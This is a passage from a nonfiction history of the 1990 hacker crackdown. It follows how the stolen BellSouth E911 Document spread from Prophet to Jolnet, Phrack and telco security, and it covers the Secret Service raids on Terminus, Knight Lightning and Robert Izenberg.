Andrews was a UNIX programmer by trade, and ran a powerful UNIX board called  Jolnet,  in the basement of his house.    Prophet, using the handle  Robert Johnson,  had obtained an account on Richard Andrews' computer.  And there he stashed the E911 Document, by storing it in his own private section of Andrews' computer.    Why did Prophet do this   If Prophet had eliminated the E911 Document from his own computer, and kept it hundreds of miles away, on another machine, under an alias, then he might have been fairly safe from discovery and prosecution  although his sneaky action had certainly put the unsuspecting Richard Andrews at risk.    But, like most hackers, Prophet was a pack rat for illicit data.  When it came to the crunch, he could not bear to part from his trophy.  When Prophet's place in Decatur, Georgia was raided in July 1989, there was the E911 Document, a smoking gun.  And there was Prophet in the hands of the Secret Service, doing his best to  explain.     Our story now takes us away from the Atlanta Three and their raids of the Summer of 1989.  We must leave Atlanta Three  cooperating fully  with their numerous investigators.  And all three of them did cooperate, as their Sentencing Memorandum from the US District Court of the Northern Division of Georgia explained  just before all three of them were sentenced to various federal prisons in November 1990.    We must now catch up on the other aspects of the war on the Legion of Doom.  The war on the Legion was a war on a network  in fact, a network of three networks, which intertwined and interrelated in a complex fashion.  The Legion itself, with Atlanta LoD, and their hanger on Fry Guy, were the first network. The second network was PHRACK magazine, with its editors and contributors.    The third network involved the electronic circle around a hacker known as  Terminus.     The war against these hacker networks was carried out by a law enforcement network.  Atlanta LoD and Fry Guy were pursued by USSS agents and federal prosecutors in Atlanta, Indiana, and Chicago.   Terminus  found himself pursued by USSS and federal prosecutors from Baltimore and Chicago.  And the war against Phrack was almost entirely a Chicago operation.    The investigation of Terminus involved a great deal of energy, mostly from the Chicago Task Force, but it was to be the least known and least publicized of the Crackdown operations. Terminus, who lived in Maryland, was a UNIX programmer and consultant, fairly well known  under his given name  in the UNIX community, as an acknowledged expert on AT T minicomputers. Terminus idolized AT T, especially Bellcore, and longed for public recognition as a UNIX expert  his highest ambition was to work for Bell Labs.    But Terminus had odd friends and a spotted history. Terminus had once been the subject of an admiring interview in PHRACK  Volume II, Issue 14, Phile 2  dated May 1987 .  In this article, PHRACK co editor Taran King described  Terminus  as an electronics engineer, 5'9 , brown haired, born in 1959  at 28 years old, quite mature for a hacker.    Terminus had once been sysop of a phreak hack underground board called  MetroNet,  which ran on an Apple II.  Later he'd replaced  MetroNet  with an underground board called  MegaNet,  specializing in IBMs.  In his younger days, Terminus had written one of the very first and most elegant code scanning programs for the IBM PC.  This program had been widely distributed in the underground.  Uncounted legions of PC owning phreaks and hackers had used Terminus's scanner program to rip off telco codes. This feat had not escaped the attention of telco security  it hardly could, since Terminus's earlier handle,  Terminal Technician,  was proudly written right on the program.    When he became a full time computer professional  specializing in telecommunications programming , he adopted the handle Terminus, meant to indicate that he had  reached the final point of being a proficient hacker.   He'd moved up to the UNIX  based  Netsys  board on an AT T computer, with four phone lines and an impressive 240 megs of storage.   Netsys  carried complete issues of PHRACK, and Terminus was quite friendly with its publishers, Taran King and Knight Lightning.    In the early 1980s, Terminus had been a regular on Plovernet, Pirate 80, Sherwood Forest and Shadowland, all well  known pirate boards, all heavily frequented by the Legion of Doom.  As it happened, Terminus was never officially  in LoD,  because he'd never been given the official LoD high sign and back slap by Legion maven Lex Luthor.  Terminus had never physically met anyone from LoD.  But that scarcely mattered much  the Atlanta Three themselves had never been officially vetted by Lex, either.    As far as law enforcement was concerned, the issues were clear. Terminus was a full time, adult computer professional with particular skills at AT T software and hardware  but Terminus reeked of the Legion of Doom and the underground.    On February 1, 1990  half a month after the Martin Luther King Day Crash  USSS agents Tim Foley from Chicago, and Jack Lewis from the Baltimore office, accompanied by AT T security officer Jerry Dalton, travelled to Middle Town, Maryland.  There they grilled Terminus in his home  to the stark terror of his wife and small children , and, in their customary fashion, hauled his computers out the door.    The Netsys machine proved to contain a plethora of arcane UNIX software  proprietary source code formally owned by AT T. Software such as   UNIX System Five Release 3.2  UNIX SV Release 3.1  UUCP communications software  KORN SHELL  RFS  IWB  WWB  DWB  the C   programming language  PMON  TOOL CHEST  QUEST  DACT, and S FIND.    In the long established piratical tradition of the underground, Terminus had been trading this illicitly copied software with a small circle of fellow UNIX programmers.  Very unwisely, he had stored seven years of his electronic mail on his Netsys machine, which documented all the friendly arrangements he had made with his various colleagues.    Terminus had not crashed the AT T phone system on January 15.  He was, however, blithely running a not for profit AT T software piracy ring.  This was not an activity AT T found amusing.  AT T security officer Jerry Dalton valued this  stolen  property at over three hundred thousand dollars.    AT T's entry into the tussle of free enterprise had been complicated by the new, vague groundrules of the information economy.  Until the break up of Ma Bell, AT T was forbidden to sell computer hardware or software.  Ma Bell was the phone company  Ma Bell was not allowed to use the enormous revenue from telephone utilities, in order to finance any entry into the computer market.    AT T nevertheless invented the UNIX operating system. And somehow AT T managed to make UNIX a minor source of income. Weirdly, UNIX was not sold as computer software, but actually retailed under an obscure regulatory exemption allowing sales of surplus equipment and scrap.  Any bolder attempt to promote or retail UNIX would have aroused angry legal opposition from computer companies.  Instead, UNIX was licensed to universities, at modest rates, where the acids of academic freedom ate away steadily at AT T's proprietary rights.    Come the breakup, AT T recognized that UNIX was a potential gold mine.  By now, large chunks of UNIX code had been created that were not AT T's, and were being sold by others.  An entire rival UNIX based operating system had arisen in Berkeley, California  one of the world's great founts of ideological hackerdom .  Today,  hackers  commonly consider  Berkeley UNIX  to be technically superior to AT T's  System V UNIX,  but AT T has not allowed mere technical elegance to intrude on the real  world business of marketing proprietary software.  AT T has made its own code deliberately incompatible with other folks' UNIX, and has written code that it can prove is copyrightable, even if that code happens to be somewhat awkward   kludgey.   AT T UNIX user licenses are serious business agreements, replete with very clear copyright statements and non disclosure clauses.    AT T has not exactly kept the UNIX cat in the bag, but it kept a grip on its scruff with some success.  By the rampant, explosive standards of software piracy, AT T UNIX source code is heavily copyrighted, well guarded, well licensed.  UNIX was traditionally run only on mainframe machines, owned by large groups of suit and tie professionals, rather than on bedroom machines where people can get up to easy mischief.    And AT T UNIX source code is serious high level programming.  The number of skilled UNIX programmers with any actual motive to swipe UNIX source code is small.  It's tiny, compared to the tens of thousands prepared to rip off, say, entertaining PC games like  Leisure Suit Larry.     But by 1989, the warez d00d underground, in the persons of Terminus and his friends, was gnawing at AT T UNIX.  And the property in question was not sold for twenty bucks over the counter at the local branch of Babbage's or Egghead's  this was massive, sophisticated, multi line, multi author corporate code worth tens of thousands of dollars.    It must be recognized at this point that Terminus's purported ring of UNIX software pirates had not actually made any money from their suspected crimes.  The  300,000 dollar figure bandied about for the contents of Terminus's computer did not mean that Terminus was in actual illicit possession of three hundred thousand of AT T's dollars.  Terminus was shipping software back and forth, privately, person to person, for free. He was not making a commercial business of piracy.  He hadn't asked for money  he didn't take money.  He lived quite modestly.    AT T employees  as well as freelance UNIX consultants, like Terminus  commonly worked with  proprietary  AT T software, both in the office and at home on their private machines.  AT T rarely sent security officers out to comb the hard disks of its consultants.  Cheap freelance UNIX contractors were quite useful to AT T  they didn't have health insurance or retirement programs, much less union membership in the Communication Workers of America.  They were humble digital drudges, wandering with mop and bucket through the Great Technological Temple of AT T  but when the Secret Service arrived at their homes, it seemed they were eating with company silverware and sleeping on company sheets!  Outrageously, they behaved as if the things they worked with every day belonged to them!    And these were no mere hacker teenagers with their hands full of trash paper and their noses pressed to the corporate windowpane.  These guys were UNIX wizards, not only carrying AT T data in their machines and their heads, but eagerly networking about it, over machines that were far more powerful than anything previously imagined in private hands.  How do you keep people disposable, yet assure their awestruck respect for your property  It was a dilemma.    Much UNIX code was public domain, available for free. Much  proprietary  UNIX code had been extensively re written, perhaps altered so much that it became an entirely new product   or perhaps not.  Intellectual property rights for software developers were, and are, extraordinarily complex and confused. And software  piracy,  like the private copying of videos, is one of the most widely practiced  crimes  in the world today.    The USSS were not experts in UNIX or familiar with the customs of its use.  The United States Secret Service, considered as a body, did not have one single person in it who could program in a UNIX environment  no, not even one.  The Secret Service WERE making extensive use of expert help, but the  experts  they had chosen were AT T and Bellcore security officials, the very victims of the purported crimes under investigation, the very people whose interest in AT T's  proprietary  software was most pronounced.    On February 6, 1990, Terminus was arrested by Agent Lewis.  Eventually, Terminus would be sent to prison for his illicit use of a piece of AT T software.    The issue of pirated AT T software would bubble along in the background during the war on the Legion of Doom.  Some half  dozen of Terminus's on line acquaintances, including people in Illinois, Texas and California, were grilled by the Secret Service in connection with the illicit copying of software. Except for Terminus, however, none were charged with a crime. None of them shared his peculiar prominence in the hacker underground.    But that did not mean that these people would, or could, stay out of trouble.  The transferral of illicit data in cyberspace is hazy and ill defined business, with paradoxical dangers for everyone concerned   hackers, signal carriers, board owners, cops, prosecutors, even random passers by.  Sometimes, well meant attempts to avert trouble or punish wrongdoing bring more trouble than would simple ignorance, indifference or impropriety.    Terminus's  Netsys  board was not a common or garden bulletin board system, though it had most of the usual functions of a board.  Netsys was not a stand alone machine, but part of the globe spanning  UUCP  cooperative network.  The UUCP network uses a set of Unix software programs called  Unix to Unix Copy,  which allows Unix systems to throw data to one another at high speed through the public telephone network.  UUCP is a radically decentralized, not for profit network of UNIX computers.  There are tens of thousands of these UNIX machines.  Some are small, but many are powerful and also link to other networks.  UUCP has certain arcane links to major networks such as JANET, EasyNet, BITNET, JUNET, VNET, DASnet, PeaceNet and FidoNet, as well as the gigantic Internet.   The so called  Internet  is not actually a network itself, but rather an  internetwork  connections standard that allows several globe spanning computer networks to communicate with one another.  Readers fascinated by the weird and intricate tangles of modern computer networks may enjoy John S. Quarterman's authoritative 719 page explication, THE MATRIX, Digital Press, 1990.     A skilled user of Terminus' UNIX machine could send and receive electronic mail from almost any major computer network in the world.  Netsys was not called a  board  per se, but rather a  node.    Nodes  were larger, faster, and more sophisticated than mere  boards,  and for hackers, to hang out on internationally  connected  nodes  was quite the step up from merely hanging out on local  boards.     Terminus's Netsys node in Maryland had a number of direct links to other, similar UUCP nodes, run by people who shared his interests and at least something of his free wheeling attitude. One of these nodes was Jolnet, owned by Richard Andrews, who, like Terminus, was an independent UNIX consultant.  Jolnet also ran UNIX, and could be contacted at high speed by mainframe machines from all over the world.  Jolnet was quite a sophisticated piece of work, technically speaking, but it was still run by an individual, as a private, not for profit hobby. Jolnet was mostly used by other UNIX programmers  for mail, storage, and access to networks.  Jolnet supplied access network access to about two hundred people, as well as a local junior college.    Among its various features and services, Jolnet also carried PHRACK magazine.    For reasons of his own, Richard Andrews had become suspicious of a new user called  Robert Johnson.   Richard Andrews took it upon himself to have a look at what  Robert Johnson  was storing in Jolnet.  And Andrews found the E911 Document.     Robert Johnson  was the Prophet from the Legion of Doom, and the E911 Document was illicitly copied data from Prophet's raid on the BellSouth computers.    The E911 Document, a particularly illicit piece of digital property, was about to resume its long, complex, and disastrous career.    It struck Andrews as fishy that someone not a telephone employee should have a document referring to the  Enhanced 911 System.   Besides, the document itself bore an obvious warning.       WARNING   NOT FOR USE OR DISCLOSURE OUTSIDE BELLSOUTH OR ANY OF ITS SUBSIDIARIES EXCEPT UNDER WRITTEN AGREEMENT.       These standard nondisclosure tags are often appended to all sorts of corporate material.  Telcos as a species are particularly notorious for stamping most everything in sight as  not for use or disclosure.   Still, this particular piece of data was about the 911 System.  That sounded bad to Rich Andrews.    Andrews was not prepared to ignore this sort of trouble. He thought it would be wise to pass the document along to a friend and acquaintance on the UNIX network, for consultation. So, around September 1988, Andrews sent yet another copy of the E911 Document electronically to an AT T employee, one Charles Boykin, who ran a UNIX based node called  attctc  in Dallas, Texas.     Attctc  was the property of AT T, and was run from AT T's Customer Technology Center in Dallas, hence the name  attctc.    Attctc  was better known as  Killer,  the name of the machine that the system was running on.   Killer  was a hefty, powerful, AT T 3B2 500 model, a multi user, multi tasking UNIX platform with 32 meg of memory and a mind boggling 3.2 Gigabytes of storage.  When Killer had first arrived in Texas, in 1985, the 3B2 had been one of AT T's great white hopes for going head to  head with IBM for the corporate computer hardware market.  Killer  had been shipped to the Customer Technology Center in the Dallas Infomart, essentially a high technology mall, and there it sat, a demonstration model.    Charles Boykin, a veteran AT T hardware and digital communications expert, was a local technical backup man for the AT T 3B2 system.  As a display model in the Infomart mall,  Killer  had little to do, and it seemed a shame to waste the system's capacity.  So Boykin ingeniously wrote some UNIX bulletin board software for  Killer,  and plugged the machine in to the local phone network.   Killer's  debut in late 1985 made it the first publicly available UNIX site in the state of Texas. Anyone who wanted to play was welcome.    The machine immediately attracted an electronic community.  It joined the UUCP network, and offered network links to over eighty other computer sites, all of which became dependent on Killer for their links to the greater world of cyberspace.  And it wasn't just for the big guys  personal computer users also stored freeware programs for the Amiga, the Apple, the IBM and the Macintosh on Killer's vast 3,200 meg archives.  At one time, Killer had the largest library of public  domain Macintosh software in Texas.    Eventually, Killer attracted about 1,500 users, all busily communicating, uploading and downloading, getting mail, gossipping, and linking to arcane and distant networks.     Boykin received no pay for running Killer.  He considered it good publicity for the AT T 3B2 system  whose sales were somewhat less than stellar , but he also simply enjoyed the vibrant community his skill had created.  He gave away the bulletin board UNIX software he had written, free of charge.    In the UNIX programming community, Charlie Boykin had the reputation of a warm, open hearted, level headed kind of guy.  In 1989, a group of Texan UNIX professionals voted Boykin  System Administrator of the Year.   He was considered a fellow you could trust for good advice.    In September 1988, without warning, the E911 Document came plunging into Boykin's life, forwarded by Richard Andrews. Boykin immediately recognized that the Document was hot property. He was not a voice communications man, and knew little about the ins and outs of the Baby Bells, but he certainly knew what the 911 System was, and he was angry to see confidential data about it in the hands of a nogoodnik.  This was clearly a matter for telco security.  So, on September 21, 1988, Boykin made yet ANOTHER copy of the E911 Document and passed this one along to a professional acquaintance of his, one Jerome Dalton, from AT T Corporate Information Security.  Jerry Dalton was the very fellow who would later raid Terminus's house.    From AT T's security division, the E911 Document went to Bellcore.    Bellcore  or BELL COmmunications REsearch  had once been the central laboratory of the Bell System.  Bell Labs employees had invented the UNIX operating system.  Now Bellcore was a quasi independent, jointly owned company that acted as the research arm for all seven of the Baby Bell RBOCs.  Bellcore was in a good position to co ordinate security technology and consultation for the RBOCs, and the gentleman in charge of this effort was Henry M. Kluepfel, a veteran of the Bell System who had worked there for twenty four years.    On October 13, 1988, Dalton passed the E911 Document to Henry Kluepfel.  Kluepfel, a veteran expert witness in telecommunications fraud and computer fraud cases, had certainly seen worse trouble than this.  He recognized the document for what it was   a trophy from a hacker break in.    However, whatever harm had been done in the intrusion was presumably old news.  At this point there seemed little to be done.  Kluepfel made a careful note of the circumstances and shelved the problem for the time being.    Whole months passed.    February 1989 arrived.  The Atlanta Three were living it up in Bell South's switches, and had not yet met their comeuppance.  The Legion was thriving.  So was PHRACK magazine. A good six months had passed since Prophet's AIMSX break in. Prophet, as hackers will, grew weary of sitting on his laurels.  Knight Lightning  and  Taran King,  the editors of PHRACK, were always begging Prophet for material they could publish.  Prophet decided that the heat must be off by this time, and that he could safely brag, boast, and strut.    So he sent a copy of the E911 Document  yet another one   from Rich Andrews' Jolnet machine to Knight Lightning's BITnet account at the University of Missouri.    Let's review the fate of the document so far.    0.  The original E911 Document.  This in the AIMSX system on a mainframe computer in Atlanta, available to hundreds of people, but all of them, presumably, BellSouth employees.  An unknown number of them may have their own copies of this document, but they are all professionals and all trusted by the phone company.    1.  Prophet's illicit copy, at home on his own computer in Decatur, Georgia.    2.  Prophet's back up copy, stored on Rich Andrew's Jolnet machine in the basement of Rich Andrews' house near Joliet Illinois.    3.  Charles Boykin's copy on  Killer  in Dallas, Texas, sent by Rich Andrews from Joliet.    4.  Jerry Dalton's copy at AT T Corporate Information Security in New Jersey, sent from Charles Boykin in Dallas.    5.  Henry Kluepfel's copy at Bellcore security headquarters in New Jersey, sent by Dalton.    6.  Knight Lightning's copy, sent by Prophet from Rich Andrews' machine, and now in Columbia, Missouri.    We can see that the  security  situation of this proprietary document, once dug out of AIMSX, swiftly became bizarre.  Without any money changing hands, without any particular special effort, this data had been reproduced at least six times and had spread itself all over the continent.  By far the worst, however, was yet to come.    In February 1989, Prophet and Knight Lightning bargained electronically over the fate of this trophy.  Prophet wanted to boast, but, at the same time, scarcely wanted to be caught.    For his part, Knight Lightning was eager to publish as much of the document as he could manage.  Knight Lightning was a fledgling political science major with a particular interest in freedom of information issues.  He would gladly publish most anything that would reflect glory on the prowess of the underground and embarrass the telcos.  However, Knight Lightning himself had contacts in telco security, and sometimes consulted them on material he'd received that might be too dicey for publication.    Prophet and Knight Lightning decided to edit the E911 Document so as to delete most of its identifying traits.  First of all, its large  NOT FOR USE OR DISCLOSURE  warning had to go. Then there were other matters.  For instance, it listed the office telephone numbers of several BellSouth 911 specialists in Florida.  If these phone numbers were published in PHRACK, the BellSouth employees involved would very likely be hassled by phone phreaks, which would anger BellSouth no end, and pose a definite operational hazard for both Prophet and PHRACK.    So Knight Lightning cut the Document almost in half, removing the phone numbers and some of the touchier and more specific information.  He passed it back electronically to Prophet  Prophet was still nervous, so Knight Lightning cut a bit more.  They finally agreed that it was ready to go, and that it would be published in PHRACK under the pseudonym,  The Eavesdropper.     And this was done on February 25, 1989.    The twenty fourth issue of PHRACK featured a chatty interview with co ed phone phreak  Chanda Leir,  three articles on BITNET and its links to other computer networks, an article on 800 and 900 numbers by  Unknown User,   VaxCat's  article on telco basics  slyly entitled  Lifting Ma Bell's Veil of Secrecy,   and the usual  Phrack World News.     The News section, with painful irony, featured an extended account of the sentencing of  Shadowhawk,  an eighteen  year old Chicago hacker who had just been put in federal prison by William J. Cook himself.    And then there were the two articles by  The Eavesdropper.   The first was the edited E911 Document, now titled  Control Office Administration Of Enhanced 911 Services for Special Services and Major Account Centers.   Eavesdropper's second article was a glossary of terms explaining the blizzard of telco acronyms and buzzwords in the E911 Document.    The hapless document was now distributed, in the usual PHRACK routine, to a good one hundred and fifty sites.  Not a hundred and fifty PEOPLE, mind you  a hundred and fifty SITES, some of these sites linked to UNIX nodes or bulletin board systems, which themselves had readerships of tens, dozens, even hundreds of people.    This was February 1989.  Nothing happened immediately. Summer came, and the Atlanta crew were raided by the Secret Service.  Fry Guy was apprehended.  Still nothing whatever happened to PHRACK.  Six more issues of PHRACK came out, 30 in all, more or less on a monthly schedule.  Knight Lightning and co editor Taran King went untouched.    PHRACK tended to duck and cover whenever the heat came down.  During the summer busts of 1987   hacker busts tended to cluster in summer, perhaps because hackers were easier to find at home than in college   PHRACK had ceased publication for several months, and laid low.  Several LoD hangers on had been arrested, but nothing had happened to the PHRACK crew, the premiere gossips of the underground.  In 1988, PHRACK had been taken over by a new editor,  Crimson Death,  a raucous youngster with a taste for anarchy files.     1989, however, looked like a bounty year for the underground.  Knight Lightning and his co editor Taran King took up the reins again, and PHRACK flourished throughout 1989. Atlanta LoD went down hard in the summer of 1989, but PHRACK rolled merrily on.  Prophet's E911 Document seemed unlikely to cause PHRACK any trouble.  By January 1990, it had been available in PHRACK for almost a year.  Kluepfel and Dalton, officers of Bellcore and AT T security, had possessed the document for sixteen months  in fact, they'd had it even before Knight Lightning himself, and had done nothing in particular to stop its distribution.  They hadn't even told Rich Andrews or Charles Boykin to erase the copies from their UNIX nodes, Jolnet and Killer.    But then came the monster Martin Luther King Day Crash of January 15, 1990.    A flat three days later, on January 18, four agents showed up at Knight Lightning's fraternity house.  One was Timothy Foley, the second Barbara Golden, both of them Secret Service agents from the Chicago office.  Also along was a University of Missouri security officer, and Reed Newlin, a security man from Southwestern Bell, the RBOC having jurisdiction over Missouri.    Foley accused Knight Lightning of causing the nationwide crash of the phone system.    Knight Lightning was aghast at this allegation.  On the face of it, the suspicion was not entirely implausible  though Knight Lightning knew that he himself hadn't done it.  Plenty of hot dog hackers had bragged that they could crash the phone system, however.   Shadowhawk,  for instance, the Chicago hacker whom William Cook had recently put in jail, had several times boasted on boards that he could  shut down AT T's public switched network.     And now this event, or something that looked just like it, had actually taken place.  The Crash had lit a fire under the Chicago Task Force.  And the former fence sitters at Bellcore and AT T were now ready to roll.  The consensus among telco security  already horrified by the skill of the BellSouth intruders  was that the digital underground was out of hand.  LoD and PHRACK must go.    And in publishing Prophet's E911 Document, PHRACK had provided law enforcement with what appeared to be a powerful legal weapon.    Foley confronted Knight Lightning about the E911 Document.    Knight Lightning was cowed.  He immediately began  cooperating fully  in the usual tradition of the digital underground.    He gave Foley a complete run of PHRACK, printed out in a set of three ring binders.  He handed over his electronic mailing list of PHRACK subscribers. Knight Lightning was grilled for four hours by Foley and his cohorts.  Knight Lightning admitted that Prophet had passed him the E911 Document, and he admitted that he had known it was stolen booty from a hacker raid on a telephone company.  Knight Lightning signed a statement to this effect, and agreed, in writing, to cooperate with investigators.    Next day  January 19, 1990, a Friday  the Secret Service returned with a search warrant, and thoroughly searched Knight Lightning's upstairs room in the fraternity house.  They took all his floppy disks, though, interestingly, they left Knight Lightning in possession of both his computer and his modem.   The computer had no hard disk, and in Foley's judgement was not a store of evidence.   But this was a very minor bright spot among Knight Lightning's rapidly multiplying troubles.  By this time, Knight Lightning was in plenty of hot water, not only with federal police, prosecutors, telco investigators, and university security, but with the elders of his own campus fraternity, who were outraged to think that they had been unwittingly harboring a federal computer criminal.    On Monday, Knight Lightning was summoned to Chicago, where he was further grilled by Foley and USSS veteran agent Barbara Golden, this time with an attorney present.  And on Tuesday, he was formally indicted by a federal grand jury.    The trial of Knight Lightning, which occurred on July 24  27, 1990, was the crucial show trial of the Hacker Crackdown.  We will examine the trial at some length in Part Four of this book.    In the meantime, we must continue our dogged pursuit of the E911 Document.    It must have been clear by January 1990 that the E911 Document, in the form PHRACK had published it back in February 1989, had gone off at the speed of light in at least a hundred and fifty different directions.  To attempt to put this electronic genie back in the bottle was flatly impossible.    And yet, the E911 Document was STILL stolen property, formally and legally speaking.  Any electronic transference of this document, by anyone unauthorized to have it, could be interpreted as an act of wire fraud.  Interstate transfer of stolen property, including electronic property, was a federal crime.    The Chicago Computer Fraud and Abuse Task Force had been assured that the E911 Document was worth a hefty sum of money. In fact, they had a precise estimate of its worth from BellSouth security personnel    79,449.  A sum of this scale seemed to warrant vigorous prosecution.  Even if the damage could not be undone, at least this large sum offered a good legal pretext for stern punishment of the thieves.  It seemed likely to impress judges and juries.  And it could be used in court to mop up the Legion of Doom.    The Atlanta crowd was already in the bag, by the time the Chicago Task Force had gotten around to PHRACK.  But the Legion was a hydra headed thing.  In late 89, a brand new Legion of Doom board,  Phoenix Project,  had gone up in Austin, Texas.  Phoenix Project was sysoped by no less a man than the Mentor himself, ably assisted by University of Texas student and hardened Doomster  Erik Bloodaxe.     As we have seen from his PHRACK manifesto, the Mentor was a hacker zealot who regarded computer intrusion as something close to a moral duty.  Phoenix Project was an ambitious effort, intended to revive the digital underground to what Mentor considered the full flower of the early 80s.  The Phoenix board would also boldly bring elite hackers face to face with the telco  opposition.   On  Phoenix,  America's cleverest hackers would supposedly shame the telco squareheads out of their stick in the  mud attitudes, and perhaps convince them that the Legion of Doom elite were really an all right crew.  The premiere of  Phoenix Project  was heavily trumpeted by PHRACK, and  Phoenix Project  carried a complete run of PHRACK issues, including the E911 Document as PHRACK had published it.    Phoenix Project was only one of many  possibly hundreds   of nodes and boards all over America that were in guilty possession of the E911 Document.  But Phoenix was an outright, unashamed Legion of Doom board.  Under Mentor's guidance, it was flaunting itself in the face of telco security personnel. Worse yet, it was actively trying to WIN THEM OVER as sympathizers for the digital underground elite.   Phoenix  had no cards or codes on it.  Its hacker elite considered Phoenix at least technically legal.  But Phoenix was a corrupting influence, where hacker anarchy was eating away like digital acid at the underbelly of corporate propriety.    The Chicago Computer Fraud and Abuse Task Force now prepared to descend upon Austin, Texas.    Oddly, not one but TWO trails of the Task Force's investigation led toward Austin.  The city of Austin, like Atlanta, had made itself a bulwark of the Sunbelt's Information Age, with a strong university research presence, and a number of cutting edge electronics companies, including Motorola, Dell, CompuAdd, IBM, Sematech and MCC.    Where computing machinery went, hackers generally followed.  Austin boasted not only  Phoenix Project,  currently LoD's most flagrant underground board, but a number of UNIX nodes.    One of these nodes was  Elephant,  run by a UNIX consultant named Robert Izenberg.  Izenberg, in search of a relaxed Southern lifestyle and a lowered cost of living, had recently migrated to Austin from New Jersey.  In New Jersey, Izenberg had worked for an independent contracting company, programming UNIX code for AT T itself.   Terminus  had been a frequent user on Izenberg's privately owned Elephant node.    Having interviewed Terminus and examined the records on Netsys, the Chicago Task Force were now convinced that they had discovered an underground gang of UNIX software pirates, who were demonstrably guilty of interstate trafficking in illicitly copied AT T source code.  Izenberg was swept into the dragnet around Terminus, the self proclaimed ultimate UNIX hacker.    Izenberg, in Austin, had settled down into a UNIX job with a Texan branch of IBM.  Izenberg was no longer working as a contractor for AT T, but he had friends in New Jersey, and he still logged on to AT T UNIX computers back in New Jersey, more or less whenever it pleased him.  Izenberg's activities appeared highly suspicious to the Task Force.  Izenberg might well be breaking into AT T computers, swiping AT T software, and passing it to Terminus and other possible confederates, through the UNIX node network.  And this data was worth, not merely  79,499, but hundreds of thousands of dollars!    On February 21, 1990, Robert Izenberg arrived home from work at IBM to find that all the computers had mysteriously vanished from his Austin apartment.  Naturally he assumed that he had been robbed.  His  Elephant  node, his other machines, his notebooks, his disks, his tapes, all gone!  However, nothing much else seemed disturbed  the place had not been ransacked.    The puzzle becaming much stranger some five minutes later.  Austin U. S. Secret Service Agent Al Soliz, accompanied by University of Texas campus security officer Larry Coutorie and the ubiquitous Tim Foley, made their appearance at Izenberg's door.  They were in plain clothes  slacks, polo shirts.  They came in, and Tim Foley accused Izenberg of belonging to the Legion of Doom.    Izenberg told them that he had never heard of the  Legion of Doom.   And what about a certain stolen E911 Document, that posed a direct threat to the police emergency lines   Izenberg claimed that he'd never heard of that, either.    His interrogators found this difficult to believe. Didn't he know Terminus     Who     They gave him Terminus's real name.  Oh yes, said Izenberg.  He knew THAT guy all right  he was leading discussions on the Internet about AT T computers, especially the AT T 3B2.    AT T had thrust this machine into the marketplace, but, like many of AT T's ambitious attempts to enter the computing arena, the 3B2 project had something less than a glittering success.  Izenberg himself had been a contractor for the division of AT T that supported the 3B2.  The entire division had been shut down.    Nowadays, the cheapest and quickest way to get help with this fractious piece of machinery was to join one of Terminus's discussion groups on the Internet, where friendly and knowledgeable hackers would help you for free.  Naturally the remarks within this group were less than flattering about the Death Star.... was THAT the problem     Foley told Izenberg that Terminus had been acquiring hot software through his, Izenberg's, machine.    Izenberg shrugged this off.  A good eight megabytes of data flowed through his UUCP site every day.  UUCP nodes spewed data like fire hoses.  Elephant had been directly linked to Netsys  not surprising, since Terminus was a 3B2 expert and Izenberg had been a 3B2 contractor.  Izenberg was also linked to  attctc  and the University of Texas.  Terminus was a well known UNIX expert, and might have been up to all manner of hijinks on Elephant.  Nothing Izenberg could do about that.  That was physically impossible.  Needle in a haystack.     In a four hour grilling, Foley urged Izenberg to come clean and admit that he was in conspiracy with Terminus, and a member of the Legion of Doom.    Izenberg denied this.  He was no weirdo teenage hacker   he was thirty two years old, and didn't even have a  handle.  Izenberg was a former TV technician and electronics specialist who had drifted into UNIX consulting as a full grown adult. Izenberg had never met Terminus, physically.  He'd once bought a cheap high speed modem from him, though.    Foley told him that this modem  a Telenet T2500 which ran at 19.2 kilobaud, and which had just gone out Izenberg's door in Secret Service custody  was likely hot property.  Izenberg was taken aback to hear this  but then again, most of Izenberg's equipment, like that of most freelance professionals in the industry, was discounted, passed hand to hand through various kinds of barter and gray market.  There was no proof that the modem was stolen, and even if it was, Izenberg hardly saw how that gave them the right to take every electronic item in his house.     Still, if the United States Secret Service figured they needed his computer for national security reasons  or whatever   then Izenberg would not kick.  He figured he would somehow make the sacrifice of his twenty thousand dollars' worth of professional equipment, in the spirit of full cooperation and good citizenship.    Robert Izenberg was not arrested.  Izenberg was not charged with any crime.  His UUCP node  full of some 140 megabytes of the files, mail, and data of himself and his dozen or so entirely innocent users  went out the door as  evidence.  Along with the disks and tapes, Izenberg had lost about 800 megabytes of data.    Six months would pass before Izenberg decided to phone the Secret Service and ask how the case was going.  That was the first time that Robert Izenberg would ever hear the name of William Cook.  As of January 1992, a full two years after the seizure, Izenberg, still not charged with any crime, would be struggling through the morass of the courts, in hope of recovering his thousands of dollars' worth of seized equipment.    In the meantime, the Izenberg case received absolutely no press coverage.  The Secret Service had walked into an Austin home, removed a UNIX bulletin board system, and met with no operational difficulties whatsoever.    Except that word of a crackdown had percolated through the Legion of Doom.   The Mentor  voluntarily shut down  The Phoenix Project.   It seemed a pity, especially as telco security employees had, in fact, shown up on Phoenix, just as he had hoped  along with the usual motley crowd of LoD heavies, hangers  on, phreaks, hackers and wannabes.  There was  Sandy  Sandquist from US SPRINT security, and some guy named Henry Kluepfel, from Bellcore itself!  Kluepfel had been trading friendly banter with hackers on Phoenix since January 30th  two weeks after the Martin Luther King Day Crash .  The presence of such a stellar telco official seemed quite the coup for Phoenix Project.    Still, Mentor could judge the climate.  Atlanta in ruins, PHRACK in deep trouble, something weird going on with UNIX nodes  discretion was advisable.  Phoenix Project went off line.    Kluepfel, of course, had been monitoring this LoD bulletin board for his own purposes  and those of the Chicago unit.  As far back as June 1987, Kluepfel had logged on to a Texas underground board called  Phreak Klass 2600.   There he'd discovered an Chicago youngster named  Shadowhawk,  strutting and boasting about rifling AT T computer files, and bragging of his ambitions to riddle AT T's Bellcore computers with trojan horse programs.  Kluepfel had passed the news to Cook in Chicago, Shadowhawk's computers had gone out the door in Secret Service custody, and Shadowhawk himself had gone to jail.    Now it was Phoenix Project's turn.  Phoenix Project postured about  legality  and  merely intellectual interest,  but it reeked of the underground.  It had PHRACK on it.  It had the E911 Document.  It had a lot of dicey talk about breaking into systems, including some bold and reckless stuff about a supposed  decryption service  that Mentor and friends were planning to run, to help crack encrypted passwords off of hacked systems.    Mentor was an adult.  There was a bulletin board at his place of work, as well.  Kleupfel logged onto this board, too, and discovered it to be called  Illuminati.   It was run by some company called Steve Jackson Games.    On March 1, 1990, the Austin crackdown went into high gear.    On the morning of March 1  a Thursday  21 year old University of Texas student  Erik Bloodaxe,  co sysop of Phoenix Project and an avowed member of the Legion 